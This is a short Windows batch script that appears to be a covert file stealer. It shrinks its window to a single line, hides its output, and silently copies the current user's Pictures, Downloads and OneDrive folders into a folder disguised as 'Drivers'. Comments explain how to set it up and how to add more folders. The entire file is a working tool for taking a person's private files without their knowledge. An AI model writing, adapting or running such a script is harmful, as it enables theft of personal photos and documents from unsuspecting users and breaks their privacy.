echo off 
MODE CON COLS=16 LINES=1 Rem this is the size of the window
color a
cd  C:\   
xcopy  /E "%USERPROFILE%\Pictures\"*.*  .\Drivers   Rem Just create a folder with the name: Drivers 
xcopy  /E "%USERPROFILE%\Downloads\"*.* .\Drivers   Rem and if you wanna olny you just have to copy the route
xcopy  /E "%USERPROFILE%\OneDrive\"*.*  .\Drivers
 
 rem xcopy  /E "%USERPROFILE%\folder\"*.*  .\Drivers

cls
exit
